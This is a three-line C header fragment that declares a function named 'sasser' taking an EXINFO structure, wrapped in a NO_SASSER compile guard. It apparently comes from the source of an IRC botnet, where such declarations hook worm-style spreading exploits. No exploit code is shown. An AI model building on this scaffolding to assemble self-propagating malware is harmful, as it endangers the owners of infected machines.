#ifndef NO_SASSER
BOOL sasser(EXINFO exinfo);
#endif	/* !NO_SASSER */